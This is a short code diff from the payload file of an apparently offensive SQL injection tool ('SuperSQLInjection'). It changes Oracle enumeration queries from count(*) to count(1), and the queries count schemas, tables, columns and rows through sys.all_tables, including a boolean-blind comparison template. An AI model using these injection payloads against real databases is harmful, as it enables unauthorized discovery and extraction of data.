@@ -17,9 +17,9 @@ namespace SuperSQLInjection.payload
         //数据库数量
         public static String dbs_count = "(select count(distinct(owner)) from sys.all_tables)";
         //表数量
-        public static String tables_count = "(select count(*) from sys.all_tables where owner='{dbname}')";
+        public static String tables_count = "(select count(1) from sys.all_tables where owner='{dbname}')";
         //列数量
-        public static String columns_count = "(select count(*) from sys.all_tab_columns where owner='{dbname}' and table_name='{table}')";
+        public static String columns_count = "(select count(1) from sys.all_tab_columns where owner='{dbname}' and table_name='{table}')";
 
 
         //获取数据库名
@@ -57,7 +57,7 @@ namespace SuperSQLInjection.payload
 
 
         //union获取数据条数
-        public static String data_count = "(select count(*) from {dbname}.{table})";
+        public static String data_count = "(select count(1) from {dbname}.{table})";
 
         public static String bool_datas_count = " " + data_count + ">={len}";
 
